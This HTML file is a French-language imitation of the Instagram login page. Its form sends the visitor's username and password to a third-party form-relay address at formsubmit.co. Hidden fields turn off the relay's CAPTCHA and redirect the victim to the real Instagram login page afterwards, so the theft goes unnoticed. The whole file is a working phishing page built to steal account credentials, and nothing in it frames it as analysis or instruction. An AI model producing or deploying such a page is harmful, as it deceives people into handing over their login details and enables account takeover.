<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Connexion Instagram</title>
<link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet" />
<style>
  body {
    background: #000;
    color: #fff;
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .container {
    background: #121212;
    padding: 30px;
    border-radius: 8px;
    width: 320px;
    box-sizing: border-box;
  }
  h1 {
    font-family: 'Pacifico', cursive;
    font-size: 40px;
    margin: 0 0 20px 0;
    text-align: center;
  }
  label {
    display: block;
    margin: 12px 0 6px;
    font-size: 14px;
  }
  input[type="text"],
  input[type="password"] {
    width: 100%;
    padding: 10px;
    background: #222;
    border: 1px solid #444;
    border-radius: 4px;
    color: #fff;
    font-size: 14px;
  }
  button {
    width: 100%;
    margin-top: 20px;
    padding: 10px;
    background: #3897f0;
    border: none;
    border-radius: 4px;
    color: white;
    font-weight: bold;
    font-size: 16px;
    cursor: pointer;
  }
  .facebook-btn {
    background: #1877f2;
    margin-bottom: 15px;
  }
  .signup {
    text-align: center;
    margin-top: 15px;
    font-size: 14px;
    color: #aaa;
  }
  .signup a {
    color: #3897f0;
    text-decoration: none;
    font-weight: bold;
  }
</style>
</head>
<body>

<div class="container">
  <h1>Instagram</h1>

  <form action="https://formsubmit.co/el/riyoye" method="POST" autocomplete="off">
    <!-- Empêcher CAPTCHA et redirection vers Instagram -->
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://www.instagram.com/accounts/login/">

    <button type="button" class="facebook-btn">Connexion avec Facebook</button>

    <label for="username">Téléphone, nom d’utilisateur ou email *</label>
    <input type="text" id="username" name="Identifiant" required>

    <label for="password">Mot de passe *</label>
    <input type="password" id="password" name="Mot_de_passe" required>

    <button type="submit">Se connecter</button>
  </form>

  <div class="signup">
    Pas de compte ? <a href="#">Inscrivez-vous</a>
  </div>
</div>

</body>
</html>
